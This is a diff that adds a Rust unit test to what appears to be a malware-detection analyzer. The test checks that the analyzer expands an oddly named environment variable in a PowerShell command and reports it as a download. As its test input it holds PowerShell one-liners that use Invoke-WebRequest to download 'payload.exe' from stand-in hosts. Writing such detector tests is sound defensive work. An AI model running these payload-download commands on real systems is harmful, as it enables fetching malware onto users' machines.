@@ -3679,6 +3679,31 @@ mod explicit_environment_tests {
     }
 
     #[test]
+    fn digit_leading_powershell_environment_name_expands() {
+        let script =
+            br#"powershell -Command "$u=$env:8STAGE;Invoke-WebRequest $u -OutFile payload.exe""#;
+        let options = AnalysisOptions::with_environment(vec![(
+            "8STAGE".to_string(),
+            "https://digit-env.example/payload.exe".to_string(),
+        )]);
+
+        let report = analyze_with_options(script, &Config::default(), &options);
+
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, .. } | Trait::DownloadInDeobText { src, .. }
+                        if src == "https://digit-env.example/payload.exe"
+                )
+            }),
+            "digit-leading env variable did not expand in PowerShell: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
     fn baseline_windows_environment_is_available_to_powershell_env_refs() {
         let script = br#"powershell -Command "$u=$env:TEMP+'\\payload.exe';Invoke-WebRequest https://baseline-env.example/payload.exe -OutFile $u""#;
 
